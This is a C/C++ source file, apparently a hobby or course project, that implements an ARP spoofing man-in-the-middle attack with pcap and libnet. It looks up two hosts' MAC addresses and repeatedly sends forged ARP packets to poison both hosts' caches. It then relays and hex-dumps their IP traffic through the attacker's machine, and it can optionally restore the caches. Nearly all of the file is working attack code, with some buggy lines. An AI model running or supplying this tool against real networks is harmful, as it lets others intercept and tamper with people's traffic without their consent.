#include <stdio.h>
#include <stdint.h>
#include <pcap.h>
#include <libnet.h>
#include <arpa/inet.h>
#include <netinet/ether.h>
#include <iostream>
#include <thread>
using namespace std;

void dump(u_int8_t *bytes, int length) {
    for(int i=0; i < length; i++) {
        if(i%16==0) printf("\n");
        printf("%02x ", bytes[i]);
    }

    printf("\n");
}

int infection_setting = true,relay_setting = true;
pcap_pkthdr *header;
pcap_t *p_handle;
uint32_t myip;
//u_char broadcast[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
uint8_t recvmac[6], targetmac[6];
libnet_ether_addr *mymac;
in_addr recvip, targetip;
struct arp_hdr
{
    uint16_t ar_hrd;
    uint16_t ar_pro;
    uint8_t ar_hln;
    uint8_t ar_pln;
    uint16_t ar_op;
    uint8_t ar_sender_mac[6];
    uint8_t ar_sender_ip[4];
    uint8_t ar_target_mac[6];
    uint8_t ar_target_ip[4];
};

bool arp_request_infection_reverse(pcap_t *handle, uint8_t *mymac, uint32_t *my_ip,
                                   in_addr *_senderip, uint8_t *_sendermac,
                                   in_addr *_targetip, uint8_t *_targetmac, int flag)
{

    u_char *_packet = (u_char *) malloc(sizeof(libnet_ethernet_hdr) + sizeof(arp_hdr));
    libnet_ethernet_hdr ethernet_hdr;
    arp_hdr arp_req_hdr;
// arp_request_infection_reverse(p_handle,mymac->ether_addr_octet, &myip,&targetip,targetmac,&recvip,recvmac,2);

    ethernet_hdr.ether_type = htons(ETHERTYPE_ARP);
    arp_req_hdr.ar_hln = 6;
    arp_req_hdr.ar_pln = 4;
    arp_req_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp_req_hdr.ar_pro = htons(ETHERTYPE_IP);
    arp_req_hdr.ar_op = htons(ARPOP_REQUEST);
    if(flag == 1) // request
    {
        memcpy(ethernet_hdr.ether_shost,mymac,6);
        memset(ethernet_hdr.ether_dhost,0xff,6);
        memcpy(arp_req_hdr.ar_sender_ip,my_ip,4);
        memcpy(arp_req_hdr.ar_sender_mac,mymac,6);
        memcpy(arp_req_hdr.ar_target_ip,_targetip,4);
        memset(arp_req_hdr.ar_target_mac,0,6);
        memcpy(_packet,&ethernet_hdr,sizeof(libnet_ethernet_hdr));
        memcpy(_packet+sizeof(libnet_ethernet_hdr),&arp_req_hdr, sizeof(arp_hdr));
        pcap_sendpacket(handle,_packet,sizeof(libnet_ethernet_hdr) + sizeof(arp_hdr));

    }
    else if(flag == 2) // infection
    {
        memcpy(ethernet_hdr.ether_dhost,_targetmac,6);
        memcpy(ethernet_hdr.ether_shost,mymac,6);
        memcpy(arp_req_hdr.ar_sender_ip,_senderip,4);
        memcpy(arp_req_hdr.ar_sender_mac,mymac,6);
        memcpy(arp_req_hdr.ar_target_ip,_targetip,4);
        memcpy(arp_req_hdr.ar_target_mac,_targetmac,6);
        memcpy(_packet,&ethernet_hdr,sizeof(ethernet_hdr));
        memcpy(_packet+sizeof(libnet_ethernet_hdr),&arp_req_hdr, sizeof(arp_hdr));
        pcap_sendpacket(handle,_packet,sizeof(libnet_ethernet_hdr) + sizeof(arp_hdr));
    }
    else if(flag == 3)
    {
        //recv reverse ,arge revers
        memset(ethernet_hdr.ether_dhost,0xff,6);
        memcpy(ethernet_hdr.ether_shost,_sendermac,6);
        memcpy(arp_req_hdr.ar_sender_ip,_senderip,4);
        memcpy(arp_req_hdr.ar_sender_mac,_sendermac,6);
        memcpy(arp_req_hdr.ar_target_ip,_targetip,4);
        memset(arp_req_hdr.ar_target_mac,0,6);
        memcpy(_packet,&ethernet_hdr,sizeof(ethernet_hdr));
        memcpy(_packet+sizeof(ethernet_hdr),&arp_req_hdr, sizeof(arp_req_hdr));
        pcap_sendpacket(handle,_packet,sizeof(libnet_ethernet_hdr) + sizeof(arp_hdr));

    }
    else
        printf("not setting!!\n");
    if(sizeof(*_packet) != NULL)
        return true;

    return false;
}
bool recive_packet(const u_char *packet, uint8_t *mac)
{   libnet_ethernet_hdr *recv_ethernet = (libnet_ethernet_hdr *)packet;
    arp_hdr *recv_arp = (arp_hdr *)(packet + sizeof(libnet_ethernet_hdr));

    if(recv_ethernet->ether_type == htons(ETHERTYPE_ARP))
    {
        if(recv_arp->ar_pro = htons(ETHERTYPE_IP) && recv_arp->ar_op == htons(ARPOP_REPLY))
        {
            memcpy(mac,recv_arp->ar_sender_mac,6);
            return true;
        }

    }

    return false;
}

bool relay(pcap_t *p_handle,u_char *packet,uint8_t *_mymac,uint8_t *_targetmac, uint8_t *_recvmac,int size)
{

    libnet_ethernet_hdr *relay_ethernet = (libnet_ethernet_hdr *)(packet);
    if(relay_ethernet->ether_type == htons(ETHERTYPE_IP))
    {

        printf("11111111111111111\n");
       //u_char* buffer = (u_char *)(malloc(size));
        if(memcmp(relay_ethernet->ether_dhost ,_mymac,6) == 0 )
        {
            if(memcmp(relay_ethernet->ether_shost,_recvmac,6) == 0)
            {

                printf("recv -> target=======================================\n");
                memcpy(relay_ethernet->ether_shost,_mymac,6);
                //memcpy(relay_ethernet->ether_dhost,_targetmac,6);
                memcpy(relay_ethernet->ether_dhost,_targetmac,6);
                dump((uint8_t *)packet, size);
                pcap_sendpacket(p_handle,packet,size);
            }
            else if(memcmp(relay_ethernet->ether_shost,_targetmac,6) == 0)
            {
                printf("target -> recv======================================\n");
                memcpy(relay_ethernet->ether_shost,_mymac,6);
                memcpy(relay_ethernet->ether_dhost,_recvmac,6);
                dump((uint8_t *)packet, size);
                pcap_sendpacket(p_handle,packet,size);
            }
            //memcpy(buffer,relay_ethernet,sizeof(libnet_ethernet_hdr));
            //memcpy(buffer + sizeof(libnet_ethernet_hdr), packet + sizeof(libnet_ethernet_hdr),size - sizeof(libnet_ethernet_hdr));
            //pcap_sendpacket(p_handle,buffer,size);
            //pcap_sendpacket(p_handle,packet,size);
            printf("!!!!!!!!!!!!!!!!!!!!!!!!!!\n\n\n");
            dump((uint8_t *)packet, size);

            return true;
        }
    }
    return false;
}


void infection_thread()
{
    while(infection_setting == true)
    {


        arp_request_infection_reverse(p_handle,mymac->ether_addr_octet, &myip, &recvip,recvmac,&targetip,targetmac,2);
        arp_request_infection_reverse(p_handle,mymac->ether_addr_octet, &myip,&targetip,targetmac,&recvip,recvmac,2); //recvmac infection
        sleep(2);
    }
}
void relay_thread()
{
    const u_char *_packet;
    while(relay_setting == true)
    {

        pcap_next_ex(p_handle,&header,&_packet);
        relay(p_handle,(u_char *)_packet,mymac->ether_addr_octet,targetmac,recvmac,header->caplen);

    }
}
int main(int argc, char *argv[])
{
    const u_char *buffer;
    char *dev;
    dev = "eth0";
    char p_errbuf[PCAP_ERRBUF_SIZE];
    char l_errbuf[LIBNET_ERRBUF_SIZE];

    if(dev == NULL)
    {
        fprintf(stderr,"couldn't find default device\n",p_errbuf);
        return 2;
    }
    p_handle = pcap_open_live(dev, BUFSIZ,1,1000,p_errbuf);

    if(p_handle == NULL)
    {
        fprintf(stderr,"couldn't find default device\n",p_errbuf);
        return 2;
    }
    //mymac get from interface
    libnet_t * l_handle = libnet_init(LIBNET_LINK,dev,l_errbuf);
    mymac = libnet_get_hwaddr(l_handle);
    printf("arp spoof buffer setting......\n");

    // get ip

    if(libnet_get_ipaddr4(l_handle) == -1)

    {
        printf("couldn't find ipv4 address\n");
    }
    else
        myip = libnet_get_ipaddr4(l_handle);
    inet_aton(argv[1],&recvip);
    inet_aton(argv[2],&targetip);
    //request
    buffer = (u_char *)(malloc(sizeof(libnet_ethernet_hdr) + sizeof(arp_hdr)));
    if(arp_request_infection_reverse(p_handle,mymac->ether_addr_octet ,&myip,0,0,&recvip,recvmac,1) == true)
    {
        while(1)
        {
            pcap_next_ex(p_handle,&header,&buffer);
            if(recive_packet(buffer,recvmac) == true)
                break;
        }

    }
    else
        printf("failing recv mac get\n");

    if(arp_request_infection_reverse(p_handle,mymac->ether_addr_octet ,&myip,0,0,&targetip,targetmac,1) == true)
    {
        while(1)
        {
            pcap_next_ex(p_handle,&header,&buffer);
            if(recive_packet(buffer,targetmac) == true)
                break;
        }
    }

    else

        printf("failing target mac get\n");
    printf("setting sucess!\n");
    //infection
    int setting;
    printf("target infection...\n");
    std::thread first (infection_thread);
    first.detach();
    std::thread second (relay_thread);
    second.detach();
    //first.detach();


    printf("do you want reverse? (Yes :1)\n");
    scanf("%d",&setting);
    if(setting == 1)
    {
        infection_setting = false;
        relay_setting = false;
        arp_request_infection_reverse(p_handle,0 ,0, &targetip,targetmac,&recvip,0,3);
        arp_request_infection_reverse(p_handle,0 ,0, &recvip,recvmac,&targetip,0,3);

    }



    //first.join();
    // second.join();
    printf("end attack....\n");
    return 0;
}



